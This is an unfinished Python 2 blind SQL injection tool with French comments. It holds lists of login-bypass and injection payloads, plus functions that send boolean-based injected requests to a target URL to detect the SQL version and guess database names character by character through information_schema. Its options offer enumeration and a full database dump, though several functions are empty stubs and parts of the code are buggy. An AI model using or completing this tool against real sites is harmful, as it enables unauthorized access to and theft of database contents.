#!/usr/bin/python2
# -*- coding: utf-8 -*-

import re
import os
import string
import sys, getopt
import urllib2, requests
from optparse import OptionParser

# --------- Global variables ----------
#global l_database_name = []
l_injnum = ["'", "1+1", "3-1", "1 or 1 = 1", "1) or (1 = 1", "1 and 1 = 2", "1) and (1 = 2", "1 or 'ab' = 'a' + 'b'", "1 or 'ab' = 'a''b", "1 or 'ab'='a'||'b'", "' and 'x' = 'p'#"]
l_bypass = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 and 1=2", "' and '1'='2'--", "1/* comment */"]
l_bypass2 = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2", "') and '1'='2'--"]
alphabet = "abcdefghijklmnopqrstuvwxyz"

# --------- Main function option parsing ----------
def main():
    arg_help = """Blind SQLi:
python sql.py TODO include args
python sql.py TODO include args"""

    parser = OptionParser(usage=arg_help)
    try:
        parser.add_option("-u", "--url", action="store", type=str, dest="URL", help="The target url to inject")
        parser.add_option("-d", "--detect-bypass", action="store", type=str, dest="BYPASS_DETECT", help="Detect the bypass to use during injection")
        parser.add_option("-e", "--enum", action="store_true", dest="ENUM", help="Enumerate databases, tables columns")
        parser.add_option("-D", "--dump", action="store_true", dest="DUMP", help="Dump the chosen database")
        parser.add_option("-b", "--database", action="store", type=str, dest="DATABASE", help="The database to dump")
    except optparse.AmbiguousOptionError as ambiguous:
        print("Ambiguous option: " + ambiguous)
    except optparse.BadOptionError as bad_option:
        print("Bad option: " + bad_option)

    # Affect options argument to variables
    (options, args) = parser.parse_args()

    url                 = options.URL
    bypass_detect       = options.BYPASS_DETECT
    enum                = options.ENUM
    dump                = options.DUMP
    database            = options.DATABASE

    # TODO algo principal ici
    # Enumerer le nombre de colonnes de la table courante pour l'injection
    # Trouver un bypass
    if not bypass_detect:
        bypass = find_bypass(url)
    else :
        bypass = bypass_detect
    # Trouver la version du serveur SQL
    sql_version(url, bypass)
    eunum_databases(url, bypass)
    # Récupérer la base de données courantes et les autres bases de données
    # Pour chaque base database
        # Récupérer les tables
        # Pour chaque table
            # Récupérer le nombre de colonnes

# --------- Find the proper bypass ----------
def find_bypass(url):
    for bypass in l_injnum,l_bypass,l_bypass2:
# a faire
        pass
    pass

# --------- Find the numer of columns ----------
def enum_columns(url, bypass):
    pass

# --------- Find SQL database version ----------
def sql_version(url, bypass):
    '''
        Request working on leettime
        Is the base request for finding the database version number
        uri = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
    '''
    for sql_version in range(4,7):

        uri = url + "' and "  + "substring(@@version,1,1)>=" + str(sql_version) + str(bypass)
        server_response = request_handler(uri)
        server_response_status = validate_request(server_response)

        if server_response_status is False:
            server_version = sql_version - 1

            if server_version == 4:
                print "SQL version 4 detected... Not yet supported!"
                sys.exit()

    return server_version

# --------- Enumerate databases ----------
def eunum_databases(url, bypass):
    '''
        Request working on leettime
        Is the base request for finding the number of databases, how many characters are in each database name
        ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)>=0 or '
    '''
    database_increment = 0

    # Count how many databases, we assume there are less than 64 databases
    while (database_increment < 64):
        uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
        server_response = request_handler(uri)
        server_response_status = validate_request(server_response)

        # If status is false then we know the number of databases
        if server_response_status is False:
            print 'Found ' + str(database_increment) + ' Databases'

            # Count how many letters in each database name
            for database_number in range(0,database_increment):
                database_letter_count = 1

                # Count how many chars in db name, we assume the database name to be less than 128 characters
                while (database_letter_count < 128):
                    uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>0" + bypass
                    server_response = request_handler(uri)
                    server_response_status = validate_request(server_response)

                    if server_response_status is False:
                        print 'Database ' + str(database_number) + ': has ' + str(database_letter_count) + ' letters'
                        database_name = ""

                        # Get the databases names
                        for letter_count in range(1,database_letter_count):

                            # Loop in ascii range to guess each character
                            for database_letter in range(1,128):
                                uri = url + "' and ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + bypass
                                server_response = request_handler(uri)
                                server_response_status = validate_request(server_response)

                                # If status is false then database_letter - 1 was the n-th char of the database name
                                if server_response_status is False:
                                    database_name = database_name + str(ord(database_letter - 1))

                    elif server_response_status is True:
                        database_letter_count = database_letter_count + 1

                l_database_name += database_name

        elif server_response_status is True:
            database_increment = database_increment + 1

# --------- Enumerate database tables ----------
def enum_tables(url, bypass, database):
    pass

# --------- Dump the database ----------
def exfiltrate_data(url, bypass, database):
    pass

# --------- Forge & send HTTP requests ----------
def request_handler(url):
    # Create session if it doesn't exist
#    if not session:
#        session = requests.session()
#    page = session.get(url)

    with requests.session() as session:
        page = session.get(url)
    return page.content

# --------- Confirm that request was executed ----------
def validate_request(page):
    if re.search('Your are welcome', page):
        return True
    if re.search('Get lost',page):
        return False
    if page == "":
        print "Error: request returned empty page!"

if __name__ == "__main__":
    main()



"""
Test utilisation de dual
   dual = ""
    for i in range (1,6):
        dual = dual + '_'
        urli = url + "' and " + "(select 1 from dual where user() LIKE '" + dual + "')" + " or '"
        print urli
        page = requests.get(urli)
        htmlpage_dual = page.content
        print "Page 2\n", htmlpage_dual, "\n"
        if htmlpage == htmlpage_dual:
            break
    print i
        """
